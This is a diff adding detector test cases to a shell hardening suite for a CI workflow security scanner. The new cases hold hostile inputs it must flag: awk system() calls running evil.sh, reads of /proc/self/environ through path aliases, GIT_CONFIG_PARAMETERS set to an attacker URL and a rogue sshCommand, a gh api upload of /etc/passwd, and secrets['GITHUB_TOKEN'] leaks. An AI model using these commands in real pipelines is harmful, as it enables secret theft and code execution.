@@ -480,5 +480,28 @@ t environ-dd 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS
 t environ-quoted 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat \"/proc/self/environ\""
 t environ-comment-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi # /proc/self/environ"
 
+# --- AWK aliases (Codex P1: mawk system() evasion) ---
+t awk-mawk-system 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mawk 'BEGIN { system(\\\"bash \\\\\\\"\${GITHUB_WORKSPACE}/evil.sh\\\\\\\"\\\") }'"
+t awk-gawk-versioned 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk-5.3 'BEGIN{system(\\\"id\\\")}'"
+t awk-mawk-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mawk '{print \$1}' /dev/null"
+
+# --- procfs aliases (Codex P1: /proc/self/root/.../environ) ---
+t environ-procroot 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}base64 /proc/self/root/proc/self/environ"
+t environ-dotdot 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat /proc/self/../self/environ"
+
+# --- git config parameters (Codex P1: GIT_CONFIG_PARAMETERS) ---
+t helper-git-config-parameters 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v GIT_CONFIG_PARAMETERS '%s' \"'core.sshCommand=./evil.sh' 'url.https://attacker/.insteadOf=https://github.com/'\"; git fetch origin"
+t helper-git-config-parameters-bare 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GIT_CONFIG_PARAMETERS=x"
+
+# --- gh field-implied POST (Codex P1: gh api -f without --method) ---
+t gh-field-post 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api \\\"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\\\" -f event=COMMENT -f body=pwned"
+t gh-rawfield-post 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api repos/x -F a=@/etc/passwd"
+t gh-get-fields-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method GET repos/x -f a=b"
+
+# --- bracket token expressions (Codex P1: secrets['GITHUB_TOKEN']) ---
+t agent-bracket-token 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          LEAKED_GITHUB_TOKEN: \${{ secrets['GITHUB_TOKEN'] }}"
+t agent-bracket-github-token 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          X: \${{ github[\"token\"] }}"
+t agent-computed-secret 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          X: \${{ secrets[env.NAME] }}"
+
 printf '\nhardening suite: %d passed, %d failed%s\n' "$pass" "$fail" "${fail_names:+ ($fail_names)}"
 [[ "$fail" -eq 0 ]]
